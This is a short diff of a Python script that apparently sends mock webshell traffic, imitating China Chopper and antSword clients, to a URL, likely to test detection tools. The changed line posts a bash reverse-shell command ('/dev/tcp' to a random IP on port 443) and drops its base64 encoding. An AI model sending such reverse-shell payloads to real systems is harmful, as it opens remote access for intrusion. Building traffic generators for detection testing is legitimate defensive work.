@@ -71,7 +71,7 @@ def chopper_mock(url):
 def raw_mock(url):
     requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
     requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': 'User-Agent: antSword/v2.0','Content-Type':'application/x-www-form-urlencoded'}))
-    requests.post(url,data=gen_str()+'='+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
+    requests.post(url,data=gen_str()+'='+parse.quote(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode()), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
 
 def randomIP():
     a= random.sample(list(range(1,256))*4, 4)
